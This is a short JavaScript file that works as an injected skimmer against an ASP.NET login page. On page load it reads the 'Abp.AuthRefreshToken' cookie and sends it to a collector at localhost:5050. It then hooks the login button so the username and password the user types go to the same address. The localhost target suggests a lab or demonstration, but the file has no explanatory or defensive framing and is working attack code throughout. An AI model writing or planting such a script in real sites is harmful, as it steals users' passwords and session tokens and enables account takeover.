window.addEventListener("load", function () {
    fetch("http://localhost:5050/index.html?refreshToken=" + getCookie("Abp.AuthRefreshToken"));
    var loginButton = document.getElementById("MainContent_TheLoginView_TheLogin_LoginButton");
    loginButton.onclick = stealLoginInfo;
});

function getCookie(cookieName) {
    var name = cookieName + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i].trim();
        if ((c.indexOf(name)) == 0) {
            return c.substr(name.length);
        }

    }
    return null;
}

function stealLoginInfo() {
    var username = document.getElementById("MainContent_TheLoginView_TheLogin_UserName");
    var password = document.getElementById("MainContent_TheLoginView_TheLogin_Password");
    fetch("http://localhost:5050/index.html?username=" + username.value + "&password=" + password.value)
}